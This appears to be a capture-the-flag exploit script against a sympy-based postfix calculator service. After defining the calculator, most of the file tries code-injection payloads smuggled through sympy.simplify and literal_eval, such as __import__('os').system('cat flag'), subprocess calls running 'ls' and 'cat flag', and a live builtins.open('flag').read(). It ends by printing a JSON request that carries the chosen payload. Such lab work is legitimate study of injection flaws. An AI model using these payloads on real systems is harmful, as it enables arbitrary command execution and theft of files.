from ast import literal_eval
import sympy
import json

regular_operators = {
    'add': lambda x, y: x + y,
    'sub': lambda x, y: x - y,
    'mul': lambda x, y: x * y,
    'div': lambda x, y: x / y,
    'pow': lambda x, y: x ** y,
}

trig_operators = {
    'sin': sympy.sin,
    'cos': sympy.cos,
    'tan': sympy.tan,
    'cot': sympy.cot,
    'sec': sympy.sec,
    'csc': sympy.csc,
    'asin': sympy.asin,
    'acos': sympy.acos,
    'atan': sympy.atan,
    'acot': sympy.acot,
    'asec': sympy.asec,
    'acsc': sympy.acsc,
}


def postfix_calculator(inp):
    stack = []
    for (ty, val) in inp:
        if ty == 'num':
            stack.append(literal_eval(val))
        elif ty == 'var':
            stack.append(sympy.Symbol(val))
        elif ty == 'op':
            if val in regular_operators:
                a = stack.pop()
                b = stack.pop()
                stack.append(regular_operators[val](b, a))
            elif val in trig_operators:
                a = stack.pop()
                stack.append(trig_operators[val](a))
            else:
                raise ValueError("Invalid operator")
    return stack

# [["var","x"],["op","sin"],["num","2"],["op","pow"],["var","x"],["op","cos"],["num","2"],["op","pow"],["op","add"]]
#   => $$ sin^2(x) + cos^2(x) = 1 $$
#
# [["num","2"],["num","2"],["op","add"]] => $$ 4 $$
#
# [["var","x"],["var","y"],["op","sub"]] => $$ x-y $$

req = [["num","2"],["num","2"],["op","add"]]

expr = postfix_calculator(req)
# print('stack ->', expr)

if len(expr) == 1:
    res = sympy.latex(expr[0]) + r'\\=\\' + sympy.latex(sympy.simplify(expr[0]))
else:
    res = r'\quad{}'.join(map(sympy.latex, expr)) + r'\\=\\\cdots'
# print(res)

# val = "input('test->')"
# val = '__import__("subprocess").getoutput("ls")'
# val = '__import__("os").system("cat flag")'
# s = sympy.simplify(val)
# print(s)

# val = "__builtins__.__dict__['__import__']('os').system('cat flag')"
# val = "__import__('os').system('cat flag')"

# val = "('__import__(\\'os\\').system(\\'cat flag\\')',)"
# val = "('__import__(\"'\"os\"\'\").system(\"'\"cat flag\"'\")',)"

# val = "('__import__(\\'os\\').popen(\\'cat flag\\').read()',)"
# val = "('__import__(\\'subprocess\\').check_output(\\'cat flag\\', shell=True).decode()',)"
val = "('repr(__import__(\\'builtins\\').open(\\'flag\\').read())',)"
# val = "('__import__(\\'subprocess\\').check_output([\\'ls\\',\\'-l\\']).decode()',)"

expr = sympy.Symbol(val)
res = sympy.latex(expr) + r'\\=\\' + sympy.latex(sympy.simplify(expr))
print(expr)
print(res)

print('---------------------')
ast_eval = literal_eval(val)
res = sympy.latex(ast_eval) + r'\\=\\' + sympy.latex(sympy.simplify(ast_eval))

print('res ->', res)

print(json.dumps([["num", val]]))

# out = __import__('subprocess').check_output('cat flag', shell=True)
# out = __import__('os').popen('cat flag').read()
# out = __import__('subprocess').check_output('cat flag', shell=True)
out = __import__('builtins').open('flag').read()
# out = __import__('subprocess').check_output(['ls', '-l']).decode()

print('out ->', out)
